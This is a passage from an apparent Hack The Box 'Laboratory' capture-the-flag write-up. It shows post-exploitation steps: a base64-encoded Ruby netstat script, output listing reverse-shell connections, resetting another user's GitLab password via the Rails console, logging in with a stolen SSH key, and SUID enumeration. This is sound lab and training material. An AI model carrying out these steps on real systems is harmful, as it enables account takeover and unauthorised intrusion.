class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9229</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8080</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9168</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0.0.0.0:80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8082</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0.0.0.0:0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0.0.0.0:0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9090</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9090</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.14.32:4444</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8082</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9229</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8060</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9187</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9168</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:55534</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.14.135:4444</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:58602</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:56314</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:57562</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:55420</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:36672</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.14.32:4444</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:36808</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.14.130:4444</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9168</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:55436</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:36678</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:46208</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9168</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:36680</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.14.32:9191</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9121</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:57568</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.14.32:9191</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:32882</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:36676</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9236</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:55434</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>While we are at it let&#x27;s create a script that directly parse <code>/proc/net/tcp</code>,
also read remote addresses, convert inode to pid will be more difficult so we&#x27;ll
skip it and won&#x27;t get the process name and get the owner names is not that hard.</p><p>Gitlab is coded in ruby so there must be a ruby binary on the server:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">git@git:~/gitlab-rails/working$ which ruby</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/opt/gitlab/embedded/bin/ruby</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Here is <code>mini-netstat.rb</code>:</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;etc&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">def decode_addr(addr)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ip, port = addr.split(&#x27;:&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ip = ip.scan(/.{2}/).map{|x|x.hex.to_s}.reverse.join(&#x27;.&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  port = port.hex.to_s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  &quot;#{ip}:#{port}&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">end</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File.readlines(&#x27;/proc/net/tcp&#x27;).each_with_index do |line, i|</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  entry = line.split(&#x27; &#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  unless i == 0 # skip headers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    laddr = decode_addr(entry[1])</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    raddr = decode_addr(entry[2])</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    uname = Etc.getpwuid(entry[7].to_i).name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    puts &quot;#{laddr} &lt;--&gt; #{laddr} -- #{uname}&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  end</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Note; I have pushed a better version <a href="https://gist.github.com/S4CH/0a8e2fad71234bd6f421b7893f3c507a" target="_blank" rel="noopener noreferrer">here</a></p><p>Let&#x27;s encode it in base64:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat mini-netstat.rb | base64 -w 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cmVxdWlyZSAnZXRjJwoKVENQX1NUQVRFUyA9IHsgIyAvdXNyL3NyYy9saW51eC9pbmNsdWRlL25ldC90Y3Bfc3RhdGVzLmgKICAnMDAnOiAnVU5LTk9XTicsCiAgJ0ZGJzogJ1VOS05PV04nLAogICcwMSc6ICdFU1RBQkxJU0hFRCcsCiAgJzAyJzogJ1NZTl9TRU5UJywKICAnMDMnOiAnU1lOX1JFQ1YnLAogICcwNCc6ICdGSU5fV0FJVDEnLAogICcwNSc6ICdGSU5fV0FJVDInLAogICcwNic6ICdUSU1FX1dBSVQnLAogICcwNyc6ICdDTE9TRScsCiAgJzA4JzogJ0NMT1NFX1dBSVQnLAogICcwOSc6ICdMQVNUX0FDSycsCiAgJzBBJzogJ0xJU1RFTicsCiAgJzBCJzogJ0NMT1NJTkcnLAogICcwQyc6ICdORVdfU1lOX1JFQ1YnCn0KCmRlZiBkZWNvZGVfYWRkcihhZGRyKQogIGlwLCBwb3J0ID0gYWRkci5zcGxpdCgnOicpCiAgaXAgPSBpcC5zY2FuKC8uezJ9LykubWFwe3x4fHguaGV4LnRvX3N9LnJldmVyc2Uuam9pbignLicpCiAgcG9ydCA9IHBvcnQuaGV4LnRvX3MKICAiI3tpcH06I3twb3J0fSIKZW5kCgpwdXRzICdsb2NhbCBhZGRyZXNzJy5sanVzdCgyMikgKyAncmVtb3RlIGFkZHJlc3MnLmxqdXN0KDIyKSArICdzdGF0ZScubGp1c3QoMTIpICsgJ3VzZXJuYW1lICh1aWQpJwpGaWxlLnJlYWRsaW5lcygnL3Byb2MvbmV0L3RjcCcpLmVhY2hfd2l0aF9pbmRleCBkbyB8bGluZSwgaXwKICBlbnRyeSA9IGxpbmUuc3BsaXQoJyAnKQogIHVubGVzcyBpID09IDAgIyBza2lwIGhlYWRlcnMKICAgIGxhZGRyID0gZGVjb2RlX2FkZHIoZW50cnlbMV0pCiAgICByYWRkciA9IGRlY29kZV9hZGRyKGVudHJ5WzJdKQogICAgc3RhdGUgPSBUQ1BfU1RBVEVTW2VudHJ5WzNdLnRvX3N5bV0KICAgIHVpZCA9IGVudHJ5WzddCiAgICB1bmFtZSA9IEV0Yy5nZXRwd3VpZCh1aWQudG9faSkubmFtZQogICAgcHV0cyAiI3tsYWRkci5sanVzdCgyMil9I3tyYWRkci5sanVzdCgyMil9I3tzdGF0ZS5sanVzdCgxMil9I3t1bmFtZX0gKCN7dWlkfSkiCiAgZW5kCmVuZA==</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And write it to the target:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ printf %s &#x27;cmVxdWlyZSAnZXRjJwoKVENQX1NUQVRFUyA9IHsgIyAvdXNyL3NyYy9saW51eC9pbmNsdWRlL25ldC90Y3Bfc3RhdGVzLmgKICAnMDAnOiAnVU5LTk9XTicsCiAgJ0ZGJzogJ1VOS05PV04nLAogICcwMSc6ICdFU1RBQkxJU0hFRCcsCiAgJzAyJzogJ1NZTl9TRU5UJywKICAnMDMnOiAnU1lOX1JFQ1YnLAogICcwNCc6ICdGSU5fV0FJVDEnLAogICcwNSc6ICdGSU5fV0FJVDInLAogICcwNic6ICdUSU1FX1dBSVQnLAogICcwNyc6ICdDTE9TRScsCiAgJzA4JzogJ0NMT1NFX1dBSVQnLAogICcwOSc6ICdMQVNUX0FDSycsCiAgJzBBJzogJ0xJU1RFTicsCiAgJzBCJzogJ0NMT1NJTkcnLAogICcwQyc6ICdORVdfU1lOX1JFQ1YnCn0KCmRlZiBkZWNvZGVfYWRkcihhZGRyKQogIGlwLCBwb3J0ID0gYWRkci5zcGxpdCgnOicpCiAgaXAgPSBpcC5zY2FuKC8uezJ9LykubWFwe3x4fHguaGV4LnRvX3N9LnJldmVyc2Uuam9pbignLicpCiAgcG9ydCA9IHBvcnQuaGV4LnRvX3MKICAiI3tpcH06I3twb3J0fSIKZW5kCgpwdXRzICdsb2NhbCBhZGRyZXNzJy5sanVzdCgyMikgKyAncmVtb3RlIGFkZHJlc3MnLmxqdXN0KDIyKSArICdzdGF0ZScubGp1c3QoMTIpICsgJ3VzZXJuYW1lICh1aWQpJwpGaWxlLnJlYWRsaW5lcygnL3Byb2MvbmV0L3RjcCcpLmVhY2hfd2l0aF9pbmRleCBkbyB8bGluZSwgaXwKICBlbnRyeSA9IGxpbmUuc3BsaXQoJyAnKQogIHVubGVzcyBpID09IDAgIyBza2lwIGhlYWRlcnMKICAgIGxhZGRyID0gZGVjb2RlX2FkZHIoZW50cnlbMV0pCiAgICByYWRkciA9IGRlY29kZV9hZGRyKGVudHJ5WzJdKQogICAgc3RhdGUgPSBUQ1BfU1RBVEVTW2VudHJ5WzNdLnRvX3N5bV0KICAgIHVpZCA9IGVudHJ5WzddCiAgICB1bmFtZSA9IEV0Yy5nZXRwd3VpZCh1aWQudG9faSkubmFtZQogICAgcHV0cyAiI3tsYWRkci5sanVzdCgyMil9I3tyYWRkci5sanVzdCgyMil9I3tzdGF0ZS5sanVzdCgxMil9I3t1bmFtZX0gKCN7dWlkfSkiCiAgZW5kCmVuZA==&#x27; | base64 -d &gt; /tmp/mini-netstat.rb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s enjoy the work:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ /opt/gitlab/embedded/bin/ruby /tmp/mini-netstat.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">local address         remote address        state       username (uid)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0.0.0.0:8060          0.0.0.0:0             LISTEN      root (0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9121        0.0.0.0:0             LISTEN      gitlab-redis (997)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9090        0.0.0.0:0             LISTEN      gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9187        0.0.0.0:0             LISTEN      gitlab-psql (996)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9093        0.0.0.0:0             LISTEN      gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9229        0.0.0.0:0             LISTEN      git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8080        0.0.0.0:0             LISTEN      git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9168        0.0.0.0:0             LISTEN      git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0.0.0.0:80            0.0.0.0:0             LISTEN      root (0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8082        0.0.0.0:0             LISTEN      git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9236        0.0.0.0:0             LISTEN      git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0.0.0.0:22            0.0.0.0:0             LISTEN      root (0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8080        127.0.0.1:37976       TIME_WAIT   root (0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:57568       127.0.0.1:9090        ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:57562       127.0.0.1:9090        ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:58602       127.0.0.1:8082        ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:56314       127.0.0.1:9229        ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8080        127.0.0.1:37978       TIME_WAIT   root (0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:36808       127.0.0.1:9187        ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:55434       127.0.0.1:9168        ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">172.17.0.2:33956      10.10.14.135:4444     ESTABLISHED git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8082        127.0.0.1:58602       ESTABLISHED git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:51426       127.0.0.1:80          TIME_WAIT   root (0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9229        127.0.0.1:56314       ESTABLISHED git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9090        127.0.0.1:57562       ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9168        127.0.0.1:55420       ESTABLISHED git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9187        127.0.0.1:36808       ESTABLISHED gitlab-psql (996)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8080        127.0.0.1:37984       TIME_WAIT   root (0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:55420       127.0.0.1:9168        ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9168        127.0.0.1:55436       ESTABLISHED git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9121        127.0.0.1:46208       ESTABLISHED gitlab-redis (997)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:55436       127.0.0.1:9168        ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8060        127.0.0.1:56772       ESTABLISHED gitlab-www (999)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:8080        127.0.0.1:37982       TIME_WAIT   root (0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:46208       127.0.0.1:9121        ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">172.17.0.2:60588      10.10.14.179:4444     ESTABLISHED git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9090        127.0.0.1:57568       ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9236        127.0.0.1:32882       ESTABLISHED git (998)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:32882       127.0.0.1:9236        ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:56772       127.0.0.1:8060        ESTABLISHED gitlab-prometheus (992)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9168        127.0.0.1:55434       ESTABLISHED git (998)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There is no internal service that we&#x27;ll be able to exploit, let&#x27;s attack with another angle.</p><p>There is a public project on Gitlab: <a href="https://git.laboratory.htb/dexter/securewebsite" target="_blank" rel="noopener noreferrer">https://git.laboratory.htb/dexter/securewebsite</a></p><p>Thx to this repository we know two usernames:</p><ul><li><a href="https://git.laboratory.htb/seven" target="_blank" rel="noopener noreferrer">https://git.laboratory.htb/seven</a></li><li><a href="https://git.laboratory.htb/dexter" target="_blank" rel="noopener noreferrer">https://git.laboratory.htb/dexter</a></li></ul><p><code>dexter</code> is most likely to have private repositories too, let&#x27;s reset its password
with the Rails console:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ gitlab-rails console -e production</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter = User.where(username: &#x27;dexter&#x27;).first</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter.password = &#x27;password&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter.password_confirmation = &#x27;password&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter.save!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can log in the newly reset credentials and find a private project:
<a href="https://git.laboratory.htb/dexter/securedocker" target="_blank" rel="noopener noreferrer">https://git.laboratory.htb/dexter/securedocker</a></p><p>A ssh key is saved: <a href="https://git.laboratory.htb/dexter/securedocker/-/blob/master/dexter/.ssh/id_rsa" target="_blank" rel="noopener noreferrer">https://git.laboratory.htb/dexter/securedocker/-/blob/master/dexter/.ssh/id_rsa</a></p><p>Lets&#x27; connect with this key:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ chmod 600 id_rsa_root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ssh dexter@10.10.10.216 -i id_rsa_root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter@laboratory:~$ id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter@laboratory:~$ cat user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">c736ec0f5526877bde3f769e34e5b7dc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We have know escaped the docker container adn are connected on the host.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-dexter-host-to-root-host">Privilege Escalation of Machine : from dexter (host) to root (host)<a href="#privilege-escalation-of-machine--from-dexter-host-to-root-host" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from dexter (host) to root (host)" title="Direct link to Privilege Escalation of Machine : from dexter (host) to root (host)">​</a></h2><p>Let&#x27;s find SUID binaries and remove some uninteresting results:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter@laboratory:~$ find / -perm -u=s -type f -exec ls -lh {} \; 2&gt;/dev/null | grep &#x27;/bin/&#x27; | grep -v &#x27;/snap/&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root dexter 17K Aug 28  2020 /usr/local/bin/docker-security</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 163K Jan 19 14:21 /usr/bin/sudo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 44K May 28  2020 /usr/bin/newgrp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 67K Apr  2  2020 /usr/bin/su</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 87K May 28  2020 /usr/bin/gpasswd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 84K May 28  2020 /usr/bin/chfn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 31K Aug 16  2019 /usr/bin/pkexec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 39K Apr  2  2020 /usr/bin/umount</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 52K May 28  2020 /usr/bin/chsh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 55K Apr  2  2020 /usr/bin/mount</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 67K May 28  